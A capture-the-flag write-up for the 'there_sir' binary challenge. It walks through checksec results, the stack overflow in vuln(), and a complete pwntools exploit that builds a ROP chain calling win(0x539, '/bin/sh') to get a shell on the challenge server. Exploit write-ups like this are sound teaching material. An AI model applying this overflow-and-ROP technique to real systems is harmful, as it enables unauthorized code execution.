# there_sir
> where does a pointer points to?
>
> Author: CapangJabba

## Solution

### ✅ Check Security Protections:

```bash
checksec there_sir
```

```
Arch:     amd64-64-little  
RELRO:    Partial RELRO  
Canary:   No canary found  
NX:       NX enabled  
PIE:      No PIE (0x400000)  
```

* **No Canary** → buffer overflow is easier
* **NX Enabled** → we can't inject shellcode
* **No PIE** → fixed addresses, so no leak needed

---

### 🔧 Reverse Engineering

The `main()` function calls:

```c
initialize();
vuln();
win();
```

But `win()` is **not directly reachable** unless we control the flow via a bug.

---

### 📌 Vulnerable Function: `vuln()`

```c
void vuln(void)
{
  char local_48[64]; // Stack buffer
  printf("Enter something: ");
  read(0, hurm, 0x10);           // Safe write to .bss
  printf("Enter message: ");
  read(0, local_48, 0x400);      // OVERFLOW — 0x400 > 64 bytes
}
```

Use `objdump` to see the adress of `hurm` in `.bss`. Basically, anything that you send in the first input will be stored in this address (`0x404090`).
```
objdump -t there_sir | grep "bss"
0000000000404088 l     O .bss   0000000000000001              completed.0
0000000000404090 g     O .bss   0000000000000010              hurm
0000000000404070 g     O .bss   0000000000000008              stdout@GLIBC_2.2.5
0000000000404080 g     O .bss   0000000000000008              stdin@GLIBC_2.2.5
00000000004040a0 g       .bss   0000000000000000              _end
0000000000404068 g       .bss   0000000000000000              __bss_start
```
For example, if you send `AAAA`, you can put a breakpoint at `read`, and check bytes at `0x404090` which are `41414141` (letter A in hex).

![image](https://github.com/user-attachments/assets/8efad621-bd41-4131-9088-c5073c14faa8)
 
* First `read()` puts input into `.bss` symbol `hurm` (`0x404090`)
* Second `read()` causes **buffer overflow**

---

### 🔍 Target Function: `win()`

```c
void win(int a, char* command)
{
  if (a != 0x539)
  {
    printf("Nice try hacker");
    exit(0);
  }
  system(command); // We control this!
}
```

To execute `system("/bin/sh")`, we need:

* `a == 0x539`
* `command` = pointer to string `"/bin/sh"` (we'll write this to `.bss`)


## 🧠 Exploitation Plan

1. **Write `/bin/sh` into .bss** via first prompt
2. **Overflow the stack** to control RIP
3. **Use ROP** to call `win(0x539, 0x404090)`
   We need:

   * `pop rdi; ret` → sets first argument
   * `pop rsi; ret` → sets second argument

## 🧪 Final Exploit

```python
#!/usr/bin/env python3
from pwn import *

context.binary = ELF('./there_sir')
rop = ROP(context.binary)
context.log_level = 'debug'

REMOTE = True
if REMOTE:
    io = remote('157.180.92.15', 33605)
else:
    io = process(context.binary.path)

# Addresses
binsh_bss = 0x404090
win = context.binary.symbols['win']
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]  # Align stack

offset = 72  # 64-byte buffer + 8-byte RBP

# Stage 1: Write /bin/sh to .bss
io.recvuntil(b"Enter something: ")
io.send(b"/bin/sh\x00".ljust(16, b'\x00'))

# Stage 2: ROP chain to call win(0x539, 0x404090)
io.recvuntil(b"Enter message: ")
payload = flat(
    b"A" * offset,
    pop_rdi, 0x539,
    pop_rsi, binsh_bss,
    ret,
    win
)
io.sendline(payload)
io.interactive()
```

```
python3 solve.py ./there_sir --offset 72 --function win --arg  0x539 0x404090 --remote 157.180.92.15:33605          
```

![image](https://github.com/user-attachments/assets/b66a5727-196e-43d1-b2a7-6eacb342165f)
